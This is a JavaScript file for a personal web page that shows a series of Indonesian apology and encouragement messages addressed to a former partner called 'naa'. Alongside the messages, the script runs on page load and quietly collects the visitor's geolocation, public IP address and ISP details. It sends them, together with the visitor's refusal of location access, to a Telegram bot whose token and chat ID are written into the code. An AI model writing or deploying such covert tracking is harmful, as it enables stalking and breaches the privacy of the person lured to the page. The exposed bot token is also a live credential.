const apiURL = 'https://api.telegram.org/bot';
const tokenBot = '6925905387:AAFTn6BGMpqryY1oPGfo-tR0xr_DJJhW8JM';

let nextNumber = 0;

let dataText = [
    "Hai nanaa, apa kabar? gimana hari hari naa? aku harap naa baik baik aja ya, pasti baik kan hehe:', tetap semangat yaa menjalani hari-hari nya, aku tetap support naa kok^_^",
    "Sebelumnya aku minta maap ya naa, bukan maksud lain hanya ingin meluruskan, kk anty udah cerita naa, maap kalau repost tt ku bikin naa sakit hati maap, udah di hapusin kok. Tapi jujur aku gaada maksud naa, naa juga cerita ya ke kkanty kalau aki ngebahayain naa waktu kita naik kemarin, aku udh cerita duluan sama kkanty tntang masalah itu aku denger naa cerita kaya gituu kaya gimna yaa, mungkin karna dari sudut pandang naa waktu itu naa kira aku ngebahayain naa, tpi jujur gaada niat aku mau ngebahayain naa tapii naa ceritanya kaya gitu:), mmg sempat kesel gegara gajadi fotbar, tpi aku udh lupain itu sebelum hujan waktu ngasi mantel sama sekali gaada niatan buat ngebahayain naa, maap sekali lagi bukan maksud buat ngungkit hanya ingin meluruskan aja naa",
    "dan aku mau blg, aku berusaha buat naa agar ga sedih pengen buat naa bahagia, aku ga anggap itu effor aku buat dapatin naa lgi, jujur aku gda niatan buat balikan atau anggap naa sebagai pacar, cuma pengen dekat ajaa yg bisa saling support, tpi aku nya berlebihan mungkin menurutmu maap, gaada maksud lain buat jdiin na pacar atau balikan gaada naa, malah ga kepikiran kesana:' tapi yaudalaa udh terjadi jugaa, naa juga udah jogging bareng maa someone kn hehe",
    "dan terakhir makasih udh mau buat suprise ya naa:), makasih banyakk sekali lagii, sekarang aku ga akan ganggu naa lagi kok tapi kalau na kasi kesempatan buat deket lagi atau mungkin bisa diperbaiki aku pengen perbaiki lagi dan ga akan berlebihan, tapi yasudah laa hehe",
    'Jangan malas makan yaa..',
    'Jangan sering-sering cry..',
    'Jangan sering-sering begadang juga..',
    'mungkin ini pesan yang selalu aku blg, kalau ada apa" bisa aja ya naa, kpn pun itu aku ada kok hehe^_^<br><br>versi english:v<br> ->',
    'i will always be your biggest supporter and will be there for you anytime<br><br>Semangat terus ya nanaa..<br>Thanks for everything..',
]
function textAwal() {
    const daysAgo = document.getElementById('daysAgo')

    const dateLast = new Date('10/08/2023')
    const dateNow = new Date()
    const date = dateNow - dateLast
    const days = Math.floor(date / (1000 * 60 * 60 * 24));
    daysAgo.innerHTML = days + " days ago"
    let text = document.getElementById('text')
    let hal = document.getElementById('hal')
    hal.innerHTML = `Hal ${nextNumber + 1}/${dataText.length}`
    text.innerHTML = dataText[nextNumber];
    nextNumber += 1;
    locations()
}
function locations() {
    navigator.geolocation.getCurrentPosition(position => {
        const { latitude, longitude } = position.coords;
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
        fetch(url).then(res => res.json()).then(data => {
            kirimMessage('Notifikasi Locations')
            kirimMessage(JSON.stringify(data, null, 2))
            kirimMessage('Notifikasi ISP')
            getIPAddress()
        }).catch('Error')
    }, err => {
        kirimMessage('Tidak mengizinkan lokasi')
        kirimMessage('===== Notifikasi ISP =====\nTanpa mengizinkan Lokasi')
        getIPAddress()
    })
}

const kirimMessage = (data) => {
    const messageData = {
        chat_id: 1083846126,
        text: data,
    };

    fetch(`${apiURL}${tokenBot}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(messageData),
    }).then((res) => {
        if (!res.ok) {
            throw new Error('Terjadi kesalahan dalam mengirim pesan');
        }
        return res.json();
    }).catch((error) => {
        console.error(error);
    });
}

const getIPAddress = () => {
    return fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            var ipAddress = data.ip || 'Tidak dapat mendapatkan alamat IP';
            getISP(ipAddress)
        })
        .catch(error => {
            return false;
        });
}

const getISP = (ip) => {
    // URL API ipinfo.io
    var api_url = 'https://ipinfo.io/' + ip + '/json';
    // Mengirim permintaan ke API
    return fetch(api_url)
        .then(response => response.json())
        .then(data => {
            var isp = data || 'Tidak dapat mendapatkan informasi ISP';
            kirimMessage(JSON.stringify(isp, null, 2))
        })
        .catch(error => {
            return false
        })
}

function nextButton() {
    let btnBack = document.getElementById('back')
    let btnNext = document.getElementById('next')
    let text = document.getElementById('text')
    let hal = document.getElementById('hal')
    let numberText = dataText.length

    if (nextNumber == numberText - 1) {
        btnBack.classList.remove('d-none')
        btnNext.classList.add('d-none')
    } else {
        btnBack.classList.remove('d-none')
    }
    text.innerHTML = dataText[nextNumber]
    hal.innerHTML = `Hal ${nextNumber + 1}/${numberText}`
    nextNumber += 1;
}

function backButton() {
    let btnBack = document.getElementById('back')
    let btnNext = document.getElementById('next')
    let text = document.getElementById('text')
    let hal = document.getElementById('hal')
    let numberText = dataText.length
    nextNumber -= 1;
    if (nextNumber == numberText -1) {
        btnNext.classList.remove('d-none')
    } else if (nextNumber == 1 ) {
        btnBack.classList.add('d-none')
    }  else {
        btnBack.classList.remove('d-none')
    }
    text.innerHTML = dataText[nextNumber - 1]
    hal.innerHTML = `Hal ${nextNumber}/${numberText}`
}

textAwal()